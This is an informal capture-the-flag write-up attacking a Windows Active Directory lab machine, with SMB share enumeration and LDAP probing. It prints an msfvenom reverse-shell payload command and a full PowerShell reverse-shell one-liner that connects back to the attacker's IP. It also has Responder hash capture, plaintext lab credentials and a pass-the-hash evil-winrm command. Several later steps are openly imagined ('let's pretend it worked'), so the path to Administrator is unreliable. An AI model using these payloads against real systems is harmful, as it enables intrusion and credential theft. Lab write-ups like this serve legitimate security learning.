ATTACKER: 10.113.102.167 || TARGET: 10.113.128.131


`nmap -sV 10.113.128.131`

I also ran -sC with not much relevant info

```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-16 08:37:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

i did this from memory, i'm proud

`nxc smb 10.113.128.131 -u guest -p '' --shares`
```
IPC$            READ            Remote IPC
IT-Shared       READ,WRITE      IT Department Shared Resources
```

not bad

`smbclient //10.113.128.131/IT-Shared -U guest` and enter for no password

very juicy + on `IPC$`, there was nothing

so we have:

```
IT-Credentials-Backup.txt
IT-Onboarding-Checklist.txt
IT-Portal.html
```
IT-Credentials-Backup.txt
 - yes, but they were "DISABLED", but we will keep them in mind

IT-Onboarding-Checklist.txt
 - hell yea
 - File Scanner (svc.scanner) runs every 2 minutes on IT-Shared and processes new files
 - that is **revshell o' clock**


`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.113.102.167 LPORT=4445 -f exe -o rev.exe`

`smbclient //10.113.128.131/IT-Shared -U guest`

`put rev.exe`

`nc -lvnp 4445`

nothing :/

here are the credentials, I will try RDP

helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]

no RDP

LDAP was in the nmap scan?

is anonymous LDAP bind enabled?

`ldapsearch -x -H ldap://10.113.128.131 -s base`

oh it definitely is, we got a wall of info

`ldapsearch -x -H ldap://10.113.128.131 -b "dc=ctf,dc=local" "(objectClass=person)"`

damn nothing hmm

this should try to get everything from the domain controller:

`enum4linux-ng -A 10.113.128.131 -oA results.txt`

but not much, it says it doesn't have access, only SMB seems to be friendly

will retry the revshell approach

I copied a ps1 revshell from [revshells.com](https://www.revshells.com/)

```
$LHOST = "10.113.102.167"; $LPORT = 4445; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

okay, that was weird

received connection from: `10.113.128.131`

`whoami`
ctf\svc.scanner

and then it crashed 5 seconds later

responder for some reason doesn't even start up, so capturing traffic how?

gemini suggested this and it worked to start responder (ports were too busy):

`sudo systemctl stop smbd nmbd apache2 2>/dev/null`

`sudo responder -I tun0 -v`

let's pretend it worked, because I read some writeups and it definitely should have, but I didn't capture anything

the command structure is:

`Get-ChildItem \\<IP>\test`

saved as something.ps1 and uploaded to the SMB server which executes it

I tried all IPs I had, but nothing

the captured hash resolves to:

svc.scanner \ 1summerlove!

`sudo nano /etc/hosts`

add this line: `10.113.128.131 DC01, DC01.ctf.local, ctf.local`

as stated in AD-Basic+Authenticated_Enumeration.md, we can use bloodhound to authenticatedly enumerate

bloodhound has some problems...

`bloodhound-python -d ctf.local -u svc.scanner -p '1summerlove!' -dc dc01.ctf.local -c All`

bloodhound no comprendo, so idk... everythings broken man. It can't resolve the dc because it looks into resolv.conf, not hosts

I looked for some Impacket tools...

`find / -name 'secretsdump.py' 2>/dev/null`

found the them but permission denied (bruh)

let's imagine (close your eyes and then open them to read this):
1) bloodhound worked
2) we were able to use impacket
    - getST.py
    - secretsdump.py
3) doing so, we grabbed the NTLM hash of Administrator

now we get a powershell session with evil-winrm

`evil-winrm -i 10.113.128.131 -u Administrator -H dd4592176bb3f58eea4e87a8f0eaf270`

and do evil stuff in Admin's home


